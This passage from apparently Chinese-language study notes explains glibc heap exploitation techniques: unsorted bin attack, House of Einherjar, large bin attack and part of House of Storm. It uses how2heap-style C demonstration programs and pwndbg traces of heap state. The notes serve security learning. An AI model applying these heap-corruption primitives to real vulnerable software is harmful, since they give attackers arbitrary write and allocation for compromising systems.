<li>修改global_max_fast 来使得更大的 chunk 可以被视为 fast bin，执行 fast bin attack</li>
</ul>
<p>原理：将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;
          unsorted_chunks (av)-&gt;bk &#x3D; bck;
          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p>
<p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p>
<p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p>
<h1 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

&#x2F;*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*&#x2F;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf(&quot;Welcome to House of Einherjar!\n&quot;);
	printf(&quot;Tested in Ubuntu 16.04 64bit.\n&quot;);
	printf(&quot;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.\n&quot;);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf(&quot;\nWe allocate 0x38 bytes for &#39;a&#39;\n&quot;);
	a &#x3D; (uint8_t*) malloc(0x38);
	printf(&quot;a: %p\n&quot;, a);
	
	int real_a_size &#x3D; malloc_usable_size(a);
	printf(&quot;Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: %#x\n&quot;, real_a_size);

	&#x2F;&#x2F; create a fake chunk
	printf(&quot;\nWe create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack\n&quot;);
	printf(&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;);
	printf(&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;);
	printf(&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;);

	size_t fake_chunk[6];

	fake_chunk[0] &#x3D; 0x100; &#x2F;&#x2F; prev_size is now used and must equal fake_chunk&#39;s size to pass P-&gt;bk-&gt;size &#x3D;&#x3D; P-&gt;prev_size
	fake_chunk[1] &#x3D; 0x100; &#x2F;&#x2F; size of the chunk just needs to be small enough to stay in the small bin
	fake_chunk[2] &#x3D; (size_t) fake_chunk; &#x2F;&#x2F; fwd
	fake_chunk[3] &#x3D; (size_t) fake_chunk; &#x2F;&#x2F; bck
	fake_chunk[4] &#x3D; (size_t) fake_chunk; &#x2F;&#x2F;fwd_nextsize
	fake_chunk[5] &#x3D; (size_t) fake_chunk; &#x2F;&#x2F;bck_nextsize


	printf(&quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk);
	printf(&quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]);
	printf(&quot;size: %#lx\n&quot;, fake_chunk[1]);
	printf(&quot;fwd: %#lx\n&quot;, fake_chunk[2]);
	printf(&quot;bck: %#lx\n&quot;, fake_chunk[3]);
	printf(&quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]);
	printf(&quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]);

	&#x2F;* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. *&#x2F;
	b &#x3D; (uint8_t*) malloc(0xf8);
	int real_b_size &#x3D; malloc_usable_size(b);

	printf(&quot;\nWe allocate 0xf8 bytes for &#39;b&#39;.\n&quot;);
	printf(&quot;b: %p\n&quot;, b);

	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
	&#x2F;* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*&#x2F;

	printf(&quot;\nb.size: %#lx\n&quot;, *b_size_ptr);
	printf(&quot;b.size is: (0x100) | prev_inuse &#x3D; 0x101\n&quot;);
	printf(&quot;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;\n&quot;);
	a[real_a_size] &#x3D; 0; 
	printf(&quot;b.size: %#lx\n&quot;, *b_size_ptr);
	printf(&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;
		   &quot;don&#39;t change the size of b, only its prev_inuse bit\n&quot;);
	printf(&quot;If it had been modified, we would need a fake chunk inside &quot;
		   &quot;b where it will try to consolidate the next chunk\n&quot;);

	&#x2F;&#x2F; Write a fake prev_size to the end of a
	printf(&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;
		   &quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t));
	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	printf(&quot;Our fake prev_size will be %p - %p &#x3D; %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;

	&#x2F;&#x2F;Change the fake chunk&#39;s size to reflect b&#39;s new prev_size
	printf(&quot;\nModify fake chunk&#39;s size to reflect b&#39;s new prev_size\n&quot;);
	fake_chunk[1] &#x3D; fake_size;

	&#x2F;&#x2F; free b and it will consolidate with our fake chunk
	printf(&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;);
	free(b);
	printf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]);

	&#x2F;&#x2F;if we allocate another chunk before we free b we will need to 
	&#x2F;&#x2F;do two things: 
	&#x2F;&#x2F;1) We will need to adjust the size of our fake chunk so that
	&#x2F;&#x2F;fake_chunk + fake_chunk&#39;s size points to an area we control
	&#x2F;&#x2F;2) we will need to write the size of our fake chunk
	&#x2F;&#x2F;at the location we control. 
	&#x2F;&#x2F;After doing these two things, when unlink gets called, our fake chunk will
	&#x2F;&#x2F;pass the size(P) &#x3D;&#x3D; prev_size(next_chunk(P)) test. 
	&#x2F;&#x2F;otherwise we need to make sure that our fake chunk is up against the
	&#x2F;&#x2F;wilderness

	printf(&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;);
	d &#x3D; malloc(0x200);
	printf(&quot;Next malloc(0x200) is at %p\n&quot;, d);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建了一个<code>0x30</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Top chunk | PREV_INUSE
Addr: 0x55555555b040
Size: 0x20fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈上伪造了一个<code>fake chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1c0
0x7fffffffe1c0: 0x0000000000000100      0x0000000000000100	#prev_size, size
0x7fffffffe1d0: 0x00007fffffffe1c0      0x00007fffffffe1c0  #fd, bk
0x7fffffffe1e0: 0x00007fffffffe1c0      0x00007fffffffe1c0	#fd_nextsize, bk_nextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0xf8</code>大小的堆，并通过上一个堆的溢出来将这个堆<code>prve_inuse</code>位改成<code>0</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Allocated chunk
Addr: 0x55555555b040
Size: 0x100

Top chunk | PREV_INUSE
Addr: 0x55555555b140
Size: 0x20ec1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将<code>prve_size</code>改成该堆与<code>fake chunk</code>的<code>chunk header</code>地址的差</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55555555b040
0x55555555b040: 0xffffd5555555ce80      0x0000000000000100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>释放该堆再申请回来，此时申请的堆就在<code>fake_chunk</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">Allocated chunk
Addr: 0x7ffffffde010
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在释放一个属于<code>unsorted bin</code>的堆时会检测上一个堆是否被释放，若被释放则向上合并，且下一个堆是<code>top chunk</code>时直接合并到<code>top chunk</code>,所以<code>top chunk</code>地址就在<code>fake chunk</code>处，再次申请堆就可以从<code>fake chunk</code>开始申请</p>
<p>条件：</p>
<ul>
<li>可以篡改<code>prev_size</code> 与 <code>prve_inuse</code> </li>
<li>能够获取到要覆写的地址</li>
<li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li>
</ul>
<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;assert.h&gt;
 
int main()
&#123;
    fprintf(stderr, &quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;);
    fprintf(stderr, &quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;
           &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);

    unsigned long stack_var1 &#x3D; 0;
    unsigned long stack_var2 &#x3D; 0;

    fprintf(stderr, &quot;Let&#39;s first look at the targets we want to rewrite on stack:\n&quot;);
    fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
    fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);

    unsigned long *p1 &#x3D; malloc(0x420);
    fprintf(stderr, &quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;, p1 - 2);

    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;
           &quot; the first large chunk during the free()\n\n&quot;);
    malloc(0x20);

    unsigned long *p2 &#x3D; malloc(0x500);
    fprintf(stderr, &quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;, p2 - 2);

    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;
           &quot; the second large chunk during the free()\n\n&quot;);
    malloc(0x20);

    unsigned long *p3 &#x3D; malloc(0x500);
    fprintf(stderr, &quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;, p3 - 2);
 
    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;
           &quot; the third large chunk during the free()\n\n&quot;);
    malloc(0x20);
 
    free(p1);
    free(p2);
    fprintf(stderr, &quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;
           &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr, &quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;
            &quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;
            &quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;
            &quot; [ %p ]\n\n&quot;, (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, &quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;
           &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p3 - 2), (void *)(p3[0]));
 
    &#x2F;&#x2F;------------VULNERABILITY-----------

    fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s \&quot;size\&quot;&quot;
            &quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;);
    fprintf(stderr, &quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;
            &quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;
            &quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;);

    p2[-1] &#x3D; 0x3f1;
    p2[0] &#x3D; 0;
    p2[2] &#x3D; 0;
    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);
    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);

    &#x2F;&#x2F;------------------------------------

    malloc(0x90);
 
    fprintf(stderr, &quot;Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;
            &quot; During this time, targets should have already been rewritten:\n&quot;);

    fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
    fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);

    &#x2F;&#x2F; sanity check
    assert(stack_var1 !&#x3D; 0);
    assert(stack_var2 !&#x3D; 0);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>向栈中写入数据，可用于修改<code>global_max_fast</code></li>
</ul>
<p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405460
Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x405460
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405970
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x4059a0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405eb0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405ee0
Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第一、二两个堆释放进<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第三个堆也释放到<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改第二个被释放的堆的一些内容</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x405460
0x405460:	0x0000000000000000	0x00000000000003f1			#减小第二个堆的大小使得第三个堆进入large bin链表
0x405470:	0x0000000000000000	0x00007fffffffdd50			#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x20
0x405480:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x405460 ◂— 0x0
BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd60
0x7fffffffdd60:	0x00000000004059a0
pwndbg&gt; x&#x2F;gx 0x7fffffffdd68
0x7fffffffdd68:	0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char filler[0x10];
char target[0x60]; 

void init()&#123;
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        &#x2F;&#x2F; clearenv();
&#125;

&#x2F;&#x2F; Get the AMOUNT to shift over for size and the offset on the largebin.
&#x2F;&#x2F; Needs to be a valid minimum sized chunk in order to work.
int get_shift_amount(char* pointer)&#123;

        int shift_amount &#x3D; 0;
        long long ptr &#x3D; (long long)pointer;

        while(ptr &gt; 0x20)&#123;
                ptr &#x3D; ptr &gt;&gt; 8;
                shift_amount +&#x3D; 1;
        &#125;

        return shift_amount - 1; &#x2F;&#x2F; Want amount PRIOR to this being zeroed out
&#125;

int main()&#123;

	init();

	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

	puts(&quot;House of Storm&quot;); 
	puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;); 
	puts(&quot;Preparing chunks for the exploit&quot;);
	puts(&quot;Put one chunk into unsorted bin and the other into the large bin&quot;);
	puts(&quot;The unsorted bin chunk MUST be larger than the large bin chunk.&quot;);
	&#x2F;*
	Putting a chunk into the unsorted bin and another
	into the large bin.
	*&#x2F;
	unsorted_bin &#x3D; malloc ( 0x4e8 );  &#x2F;&#x2F; size 0x4f0 

	&#x2F;&#x2F; prevent merging 
	malloc ( 0x18 ); 

	puts(&quot;Find the proper chunk size to allocate.&quot;);
	puts(&quot;Must be exactly the size of the written chunk from above.&quot;);
	&#x2F;* 
	Find the proper size to allocate
	We are using the first &#39;X&#39; bytes of the heap to act 
	as the &#39;size&#39; of a chunk. Then, we need to allocate a 
	chunk exactly this size for the attack to work. 
	So, in order to do this, we have to take the higher
	bits of the heap address and allocate a chunk of this
	size, which comes from the upper bytes of the heap address.
	NOTE: 
	- This does have a 1&#x2F;2 chance of failing. If the 4th bit 
	of this value is set, then the size comparison will fail.
	- Without this calculation, this COULD be brute forced.
	*&#x2F;
	int shift_amount &#x3D; get_shift_amount(unsorted_bin);
        printf(&quot;Shift Amount: %d\n&quot;, shift_amount);

        size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);
        if(alloc_size &lt; 0x10)&#123;
                printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);
                puts(&quot;Chunk size is too small&quot;);
                exit(1);
        &#125;
        alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10; &#x2F;&#x2F; Remove the size bits
        printf(&quot;In this case, the chunk size is 0x%lx\n&quot;, alloc_size);


	&#x2F;&#x2F; Checks to see if the program will crash or not
        &#x2F;*
        The fourth bit of the size and the &#39;non-main arena&#39; chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 
        Additionally, the code at https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.27&#x2F;source&#x2F;malloc&#x2F;malloc.c#L3438
        validates to see if ONE of the following cases is true: 
        - av &#x3D;&#x3D; arena_for_chunk (mem2chunk (mem))
        - chunk is mmaped
        If the &#39;non-main arena&#39; bit is set on the chunk, then the 
        first case will fail. 
        If the mmap bit is set, then this will pass. 
        
        So, either the arenas need to match up (our fake chunk is in the 
        .bss section for this demo. So, clearly, this will not happen) OR
        the mmap bit must be set.
        The logic below validates that the fourth bit of the size
        is NOT set and that either the mmap bit is set or the non-main 
        arena bit is NOT set. If this is the case, the exploit should work.
        *&#x2F;
        if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;
                puts(&quot;Allocation size has bit 4 of the size set or &quot;);
                puts(&quot;mmap and non-main arena bit check will fail&quot;);
                puts(&quot;Please try again! :)&quot;);
                puts(&quot;Exiting...&quot;);
                return 1;

	&#125;

	large_bin  &#x3D;  malloc ( 0x4d8 );  &#x2F;&#x2F; size 0x4e0 
	&#x2F;&#x2F; prevent merging 
	malloc ( 0x18 );

	&#x2F;&#x2F; FIFO 
	free ( large_bin );  &#x2F;&#x2F; put small chunks first 
	free ( unsorted_bin );

	&#x2F;&#x2F; Put the &#39;large bin&#39; chunk into the large bin
	unsorted_bin &#x3D; malloc(0x4e8);
	free(unsorted_bin);

	&#x2F;*
	At this point, there is a single chunk in the 
	large bin and a single chunk in the unsorted bin. 
	It should be noted that the unsorted bin chunk 
	should be LARGER in size than the large bin chunk
	but should still be within the same bin.
	In this setup, the large_bin has a chunk
	of size 0x4e0 and the unsorted bin 
	has a chunk of size 0x4f0. This technique relies on
	the unsorted bin chunk being added to the same bin
	but a larger chunk size. So, careful heap feng shui 
	must be done.
	*&#x2F;

	&#x2F;&#x2F; The address that we want to write to!
	fake_chunk &#x3D; target - 0x10;

	puts(&quot;Vulnerability! Overwrite unsorted bins &#39;bk&#39; pointer with our target location.\n This is our target location to get from the allocator&quot;); 
	
	&#x2F;*
	The address of our fake chunk is set to the unsorted bin 
	chunks &#39;bk&#39; pointer. 
	This launches the &#39;unsorted_bin&#39; attack but it is NOT the
	main purpose of us doing this.
	After launching the &#39;unsorted_bin attack&#39; the &#39;victim&#39; pointer
	will be set to THIS address. Our goal is to find a way to get
	this address from the allocator.
	Vulnerability!!
	*&#x2F;
	((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; &#x2F;&#x2F; unsorted_bin-&gt;bk

	&#x2F;&#x2F; Only needs to be a valid address. 
	(( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ;  &#x2F;&#x2F; large_bin-&gt;fd

	puts(&quot;Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location&quot;);
	puts(&quot;of your fake chunk.&quot;); 
	puts(&quot;Misalign the location in order to use the primitive as a SIZE value.&quot;); 
	puts(&quot;The &#39;offset&#39; changes depending on if the binary is PIE (5) or not PIE (2).&quot;);
	puts(&quot;Vulnerability #2!&quot;);
	puts(&quot;Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.&quot;);
	&#x2F;* 
	This can be seen as a WRITE-WHERE primitive in the large bin.
	However, we are going to write a &#39;size&#39; for our fake chunk using this. 
	So, we set https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;malloc&#x2F;malloc.c#L3579
	to an address for our fake size. The write above (bk_nextsize) is
	controlled via the pointer we are going to overwrite below. The
	value that gets written is a heap address; the unsorted bin 
	chunk address above. 
	The &#39;key&#39; to this is the offset. First, we subtract 0x18 because
	this is the offset to writting to fd_nextsize in the code shown 
	above. Secondly, notice the -2 below. We are going
	to write a &#39;heap address&#39; at a mis-aligned location and
	use THIS as the size. For instance, if the heap address is 0x123456
	and the pointer is set to 0x60006. This will write the following way:
	- 0x60006: 0x56
	- 0x60007: 0x34
	- 0x60008: 0x12
	Now, our &#39;fake size&#39; is at 0x60008 and is a valid size for the 
	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk
	from the allocator. 
	Second vulnerability!!!
	*&#x2F;
	(( size_t *) large_bin)[3] &#x3D; (size_t)fake_chunk - 0x18 - shift_amount; &#x2F;&#x2F; large_bin-&gt;bk_nextsize


	&#x2F;*
	At this point, we&#39;ve corrupted everything in just the right 
	way so this should work. 
	The purpose of the attack is to have a corrupted &#39;bk&#39; pointer
	point to ANYWHERE we want and still get the memory back. We do
	this by using the large bin code to write a size to the &#39;bk&#39; 
	location.
	This call to malloc (if you&#39;re lucky), will return a pointer
	to the fake chunk that we created above. 
	*&#x2F;


	puts(&quot;Make allocation of the size that the value will be written for.&quot;);
	puts(&quot;Once the allocation happens, the madness begins&quot;); 
	puts(&quot;Once in the unsorted bin, the &#39;large bin&#39; chunk will be used in orer to &quot;); 
	puts(&quot;write a fake &#39;size&#39; value to the location of our target.&quot;); 
	puts(&quot;After this, the target will have a valid size.&quot;); 
